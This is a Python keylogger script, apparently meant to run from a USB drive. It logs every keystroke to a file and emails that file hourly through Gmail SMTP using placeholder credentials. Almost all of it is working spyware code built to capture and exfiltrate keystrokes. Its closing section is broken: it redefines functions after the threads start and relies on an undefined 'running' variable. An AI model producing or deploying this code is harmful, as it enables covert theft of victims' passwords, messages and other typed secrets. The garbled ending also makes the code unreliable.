import pynput
from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging
import os
import smtplib
import ssl
from email.message import EmailMessage
import time

# Get the directory where the executable is being run (USB drive)
log_dir = os.path.dirname(os.path.abspath(__file__))

# Setup log file path
log_file = os.path.join(log_dir, "keylog.txt")

# Setup logging configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Email Configuration
EMAIL_ADDRESS = 'exemple@gmail.com'  # Replace with your email
EMAIL_PASSWORD = 'aaaa aaaa aaaa aaaa'  # Replace with your email password or app password
SEND_TO = 'exemple@gmail.com'  # Replace with the recipient email address
SMTP_SERVER = 'smtp.gmail.com'  # For Gmail, you can replace this with other email servers
SMTP_PORT = 465  # For Gmail, you can use port 465 for SSL

# Function to send email with the keylog file attached
def send_email_with_log():
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = SEND_TO
        msg.set_content('Please find the attached keylog.txt file.')

        # Attach the keylog file
        with open(log_file, 'rb') as f:
            file_data = f.read()
            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename='keylog.txt')

        # Create secure SSL connection and send the email
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        print(f"Email sent to {SEND_TO} successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to log key presses
def on_press(key):
    try:
        # For alphanumeric keys
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys (ctrl, shift, etc.)
        logging.info(f"Special key pressed: {key}")

# Start the listener
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to periodically send the log via email
def schedule_email(interval=60*60):  # Default interval: 1 hour
    while True:
        time.sleep(interval)  # Wait for the specified interval
        send_email_with_log()  # Send the log file via email

# Run both keylogger and email scheduler
if __name__ == "__main__":
    # Run the keylogger in one thread and email scheduler in another thread
    import threading
    keylogger_thread = threading.Thread(target=start_keylogger)
    email_thread = threading.Thread(target=schedule_email, args=(60 * 60,))  # Send every hour

    keylogger_thread.start()
    email_thread.start()

    def on_press(key):
      global running
    # Check if the key combination to stop the keylogger is pressed
      if key == keyboard.Key.shift_r:
        running = False
        return False  # Stop the listener

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

while running:
    start_keylogger()
print("Keylogger has been stopped.")
